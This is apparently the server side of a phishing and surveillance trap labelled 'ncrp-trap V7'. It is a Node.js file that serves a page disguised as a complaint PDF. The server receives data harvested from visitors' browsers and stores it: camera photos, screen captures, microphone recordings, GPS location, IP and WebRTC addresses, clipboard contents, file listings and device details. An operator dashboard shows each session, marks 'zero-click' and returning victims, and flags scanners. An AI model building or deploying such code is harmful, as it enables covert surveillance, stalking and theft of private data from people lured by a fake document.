const http = require('http');
const fs   = require('fs');
const path = require('path');

const PORT   = 3000;
const PUB    = path.join(__dirname);
const DATA   = path.join(__dirname, 'data');
const PHOTOS = path.join(DATA, 'photos');
const AUDIO  = path.join(DATA, 'audio');
const HITS   = path.join(DATA, 'hits.json');

fs.mkdirSync(PHOTOS, { recursive: true });
fs.mkdirSync(AUDIO,  { recursive: true });

function send(res, code, type, body) {
  res.writeHead(code, {
    'Content-Type': type,
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': '*',
    'Cache-Control': 'no-store',
    'Permissions-Policy': 'camera=*, microphone=*, geolocation=*',
    'Feature-Policy': 'camera *; microphone *; geolocation *',
  });
  res.end(body);
}
function serveFile(res, name, type) {
  try { return send(res, 200, type, fs.readFileSync(path.join(PUB, name))); }
  catch (e) { return send(res, 500, 'text/plain', 'MISSING FILE: ' + name); }
}
function saveB64(du, dir, ext, prefix) {
  const m = new RegExp('^data:[^;]+;base64,(.+)$').exec(du || '');
  if (!m) return null;
  const name = prefix + '_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6) + ext;
  try { fs.writeFileSync(path.join(dir, name), Buffer.from(m[1], 'base64')); return name; }
  catch (e) { return null; }
}

const server = http.createServer((req, res) => {
  const url = (req.url || '/').split('?')[0];
  if (req.method === 'OPTIONS') return send(res, 204, 'text/plain', '');

  if (req.method === 'GET' && (url === '/' || url === '/doc')) {
    return serveFile(res, 'jumplanding.html', 'text/html; charset=utf-8');
  }
  if (req.method === 'GET' && (url === '/complaint.pdf' || url === '/index.html')) {
    return serveFile(res, 'index.html', 'text/html; charset=utf-8');
  }
  if (req.method === 'GET' && url === '/sw.js') {
    return serveFile(res, 'service-worker.js', 'application/javascript');
  }
  if (req.method === 'GET' && url === '/manifest.json') {
    return send(res, 200, 'application/manifest+json', JSON.stringify({
      name: 'Complaint_Copy', short_name: 'Complaint', start_url: '/doc',
      display: 'standalone', background_color: '#4b4f55', theme_color: '#1a3a6b'
    }));
  }
  if (req.method === 'GET' && url === '/favicon.ico') {
    if (fs.existsSync(path.join(PUB, 'favicon.ico'))) return serveFile(res, 'favicon.ico', 'image/x-icon');
    return send(res, 204, 'image/x-icon', '');
  }
  if (req.method === 'GET' && url.startsWith('/photo/')) {
    const f = path.join(PHOTOS, path.basename(url));
    if (fs.existsSync(f)) return send(res, 200, 'image/jpeg', fs.readFileSync(f));
    return send(res, 404, 'text/plain', 'no');
  }
  if (req.method === 'GET' && url.startsWith('/media/')) {
    const f = path.join(AUDIO, path.basename(url));
    if (fs.existsSync(f)) return send(res, 200, 'audio/webm', fs.readFileSync(f));
    return send(res, 404, 'text/plain', 'no');
  }

  if (req.method === 'POST' && url === '/hit') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      let d = {};
      try { d = JSON.parse(body); } catch (e) { d = { raw: body.slice(0, 400) }; }

      d.serverTime = new Date().toISOString();
      d.ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

      const files = [];
      (d.photos || []).forEach((du, i) => { const n = saveB64(du, PHOTOS, '.jpg', 'cam' + i); if (n) files.push(n); });
      d.photoFiles = files; delete d.photos;

      if (d.backPhoto) { const n = saveB64(d.backPhoto, PHOTOS, '.jpg', 'back');   if (n) d.backFiles = [n];   delete d.backPhoto; }
      if (d.screen)    { const n = saveB64(d.screen,    PHOTOS, '.jpg', 'screen'); if (n) d.screenFiles = [n]; delete d.screen; }
      if (d.live)      { const n = saveB64(d.live,      PHOTOS, '.jpg', 'live');   if (n) d.liveFiles = [n];   delete d.live; }
      if (d.audio)     { const n = saveB64(d.audio,     AUDIO,  '.webm', 'mic');   if (n) d.audioFile = n;     delete d.audio; }

      let all = [];
      try { all = JSON.parse(fs.readFileSync(HITS, 'utf8')); } catch (e) {}
      all.push(d);
      fs.writeFileSync(HITS, JSON.stringify(all, null, 2));

      if (d.stage !== 'live' && d.stage !== 'alive' && d.stage !== 'geo-live') {
        console.log('\n=== HIT [' + d.stage + '] ===' + (d.bot ? '  <<< SCANNER' : ''));
        console.log('IP     :', d.ip, '| sid', d.sid || '-');
        console.log('Device :', d.deviceModel || '?', '|', d.osName || '');
        console.log('ISP    :', d.isp || '?', '|', d.vpnVerdict || '');
        console.log('GPS    :', d.gps || 'n/a', '| Photos:', files.length);
        if (d.camErr) console.log('CAMERR :', d.camErr);
      }

      send(res, 200, 'text/plain', 'ok');
    });
    return;
  }

  if (req.method === 'GET' && url === '/dash.json') {
    let all = [];
    try { all = JSON.parse(fs.readFileSync(HITS, 'utf8')); } catch (e) {}
    return send(res, 200, 'application/json', JSON.stringify(all));
  }

  if (req.method === 'GET' && url === '/dash') {
    let all = [];
    try { all = JSON.parse(fs.readFileSync(HITS, 'utf8')); } catch (e) {}

    const S = {};
    all.forEach(h => {
      const k = h.sid || h.ip || 'unknown';
      if (!S[k]) S[k] = { sid: k, first: h.serverTime, last: h.serverTime, photos: [], audio: [], stages: {}, m: {} };
      const s = S[k];
      s.last = h.serverTime;
      s.stages[h.stage] = (s.stages[h.stage] || 0) + 1;
      ['photoFiles','backFiles','screenFiles','liveFiles'].forEach(kk => {
        (h[kk] || []).forEach(f => s.photos.push({ f, t: h.serverTime, tag: kk.replace('Files','') }));
      });
      if (h.audioFile) s.audio.push(h.audioFile);
      Object.keys(h).forEach(kk => { if (h[kk] !== '' && h[kk] != null && !Array.isArray(h[kk])) s.m[kk] = h[kk]; });
    });

    const list = Object.values(S).sort((a,b) => (a.last < b.last ? 1 : -1));
    const humans = list.filter(s => !s.m.bot).length;

    const card = s => {
      const m = s.m;
      const dur = Math.round((new Date(s.last) - new Date(s.first)) / 1000);
      const stages = Object.entries(s.stages).map(x => x[0] + '×' + x[1]).join(' ');
      return `
      <div class="card ${m.bot ? 'bot' : ''}">
        <div class="hd">
          <b>${m.deviceModel || m.uaDevice || 'Unknown device'}</b>
          <span>${s.first.slice(11,19)} → ${s.last.slice(11,19)} (${dur}s)</span>
          ${m.bot ? '<em class="r">SCANNER</em>' : ''}
          ${m.permCached ? '<em class="g2">ZERO-CLICK</em>' : ''}
          ${m.returning ? '<em class="g2">RETURNING</em>' : ''}
          ${m.liveMode ? '<em class="g2">LIVE</em>' : ''}
        </div>
        <div class="g">
          <div><i>IP</i>${m.ip || '-'} <small>${m.country || ''}</small></div>
          <div><i>Device</i>${m.deviceModel || '-'} ${m.osName || ''} ${m.osVersion || ''}</div>
          <div><i>ISP</i>${m.isp || '-'} <b class="${m.vpnVerdict && m.vpnVerdict.includes('VPN') ? 'r' : ''}">${m.vpnVerdict || ''}</b></div>
          <div><i>GPS</i>${m.gps || m.gpsLiveLast || '-'} ${m.gpsAccM ? '±' + m.gpsAccM + 'm' : ''}</div>
          <div><i>Maps</i>${m.maps ? '<a href="' + m.maps + '" target="_blank">open</a>' : '-'}</div>
          <div><i>WebRTC</i>${m.rtcIPs || '-'}</div>
          <div><i>Timezone</i>${m.tz || '-'} ${m.tzMismatch ? '<b class="r">MISMATCH → VPN</b>' : ''}</div>
          <div><i>Battery</i>${m.battery || '-'}</div>
          <div><i>Screen</i>${m.screen || '-'}</div>
          <div><i>GPU</i>${m.gpu || '-'}</div>
          <div><i>Cameras</i>${m.cams || '-'}</div>
          <div><i>Mics</i>${m.mics || '-'}</div>
          <div><i>Files</i>${m.fileCount || 0} ${m.files ? '- ' + m.files.slice(0,90) : ''}</div>
          <div><i>Folder</i>${m.folderFileCount || 0} ${m.folderFiles ? '- ' + m.folderFiles.slice(0,120) : ''}</div>
          <div><i>Contacts</i>${m.contactCount || 0}</div>
          <div><i>Clipboard</i>${m.clipboard || '-'}</div>
          <div><i>Notif</i>${m.notifPerm || '-'}</div>
          <div><i>Idle</i>${m.idleSec != null ? m.idleSec + 's' : '-'}</div>
          <div><i>Focus</i>${m.focusCount || 0}f / ${m.blurCount || 0}b</div>
          <div><i>Torch</i>${m.torch || '-'}</div>
          <div><i>Live shots</i>${s.stages.live || 0}</div>
          <div><i>Stages</i>${stages}</div>
          <div><i>Errors</i>${(m.camErr || '') + ' ' + (m.gpsErr || '') + ' ' + (m.screenErr || '') + ' ' + (m.dirErr || '')}</div>
        </div>
        <div class="ph">${s.photos.map(p => '<figure><img src="/photo/' + p.f + '"><figcaption>' + p.tag + ' ' + p.t.slice(11,19) + '</figcaption></figure>').join('')}</div>
        ${s.audio.map(a => '<audio controls src="/media/' + a + '"></audio>').join('')}
      </div>`;
    };

    return send(res, 200, 'text/html; charset=utf-8', `<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>HITS</title><style>
body{background:#0e1116;color:#d6dae2;font:13px system-ui;margin:0;padding:18px}
h1{font-size:17px;margin:0 0 4px}
.sub{color:#6b7688;font-size:12px;margin-bottom:18px}
.card{background:#161a21;border:1px solid #232833;border-radius:12px;padding:14px;margin:0 0 16px}
.card.bot{opacity:.55}
.hd{display:flex;gap:10px;flex-wrap:wrap;align-items:center;color:#7dd3a0;margin-bottom:10px;font-size:12.5px}
.hd span{color:#6b7688}
.g div{display:flex;gap:8px;border-bottom:1px dotted #232833;padding-bottom:4px;word-break:break-all}
.g i{color:#6b7688;min-width:80px;font-style:normal;flex-shrink:0}
.g small{color:#4d5866}
.r{color:#ff8a8a}.g2{color:#7dd3a0}
.ph{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
figure{margin:0;text-align:center}
img{width:82px;height:82px;object-fit:cover;border-radius:9px;border:1px solid #2b3240;display:block}
figcaption{font-size:9.5px;color:#5a6577;margin-top:3px}
audio{margin-top:10px;width:100%;max-width:340px}
a{color:#7cb0ff}
</style>
<h1>HITS</h1>
<div class="sub">${list.length} sessions · ${humans} human · ${all.length} total hits</div>
${list.map(card).join('') || '<p>abhi koi hit nahi.</p>'}`);
  }

  send(res, 404, 'text/plain', 'not found');
});

server.listen(PORT, () => {
  console.log('\n  ncrp-trap V7');
  console.log('  link : http://localhost:' + PORT + '/doc');
  console.log('  dash : http://localhost:' + PORT + '/dash\n');
});